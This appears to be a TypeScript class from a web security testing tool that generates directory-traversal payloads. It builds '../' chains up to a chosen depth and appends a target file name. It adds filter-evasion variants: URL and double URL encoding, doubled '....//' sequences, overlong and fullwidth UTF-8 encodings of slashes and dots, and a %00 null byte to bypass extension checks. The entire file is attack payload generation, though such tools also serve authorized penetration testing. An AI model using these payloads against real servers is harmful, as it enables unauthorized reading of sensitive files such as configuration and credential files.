import { BaseGenerator, DirectoryTraversalGenerateOption } from '.'

export default class DirectoryTraversalGenerator implements BaseGenerator {
  private options: DirectoryTraversalGenerateOption
  private originalList: string[]

  private idxFlag: number

  constructor(options: DirectoryTraversalGenerateOption) {
    this.originalList = []
    this.idxFlag = 0

    this.options = options
    this.showList = []
    this.init()
  }

  private generateAllLevelParams(maxLevel: number, isLinux: boolean) {
    const list = []
    for (let i = 1; i <= maxLevel; i++) {
      let tmpStr = ''
      for (let j = 1; j <= i; j++) {
        tmpStr = (isLinux ? '../' : '..\\') + tmpStr
      }
      list.push(tmpStr)
    }
    return list
  }

  private init = () => {
    const {
      fileName,
      maxLevel,
      extName,
      skipExtensionCheck,
      isLinux,
      encodeURI,
      doubleEncodeURI,
      doubleWrite,
      nonStandardEncode1,
      nonStandardEncode2,
      nonStandardEncode3
    } = this.options
    const allLevelKeys = this.generateAllLevelParams(maxLevel, isLinux)
    const list: string[] = [...allLevelKeys]

    if (encodeURI) {
      list.push(...allLevelKeys.map(key => encodeURIComponent(key).replace(/\./g, '%2E')))
    }
    if (doubleEncodeURI) {
      list.push(
        ...allLevelKeys.map(key =>
          encodeURIComponent(encodeURIComponent(key).replace(/\./g, '%2E'))
        )
      )
    }
    if (doubleWrite) {
      if (isLinux) {
        list.push(...allLevelKeys.map(key => key.replace(/\.\.\//g, '....//')))
      } else {
        list.push(...allLevelKeys.map(key => key.replace(/\.\.\\/g, '....\\\\')))
      }
    }
    if (nonStandardEncode1) {
      if (isLinux) {
        list.push(...allLevelKeys.map(key => key.replace(/\//g, '%c0%af')))
      } else {
        list.push(...allLevelKeys.map(key => key.replace(/\\/g, '%c1%9c')))
      }
    }
    if (nonStandardEncode2) {
      if (isLinux) {
        list.push(...allLevelKeys.map(key => key.replace(/\//g, '%ef%bc%8f')))
      } else {
        list.push(...allLevelKeys.map(key => key.replace(/\\/g, '%ef%bc%bc')))
      }
    }
    if (nonStandardEncode3) {
      list.push(...allLevelKeys.map(key => key.replace(/\./g, '%c0%ae')))
    }

    const dedupList = [
      ...new Set(
        list.map(
          item =>
            `${item}${fileName}${extName ? `${skipExtensionCheck ? '%00' : ''}.${extName}` : ''}`
        )
      )
    ]
    this.originalList = dedupList
    this.length = dedupList.length
    this.showList = dedupList
  }

  length = 0
  showList: string[] = []

  next() {
    const value = this.originalList[this.idxFlag]

    if (value) {
      this.idxFlag = this.idxFlag + 1
      return value
    }

    return undefined
  }
}
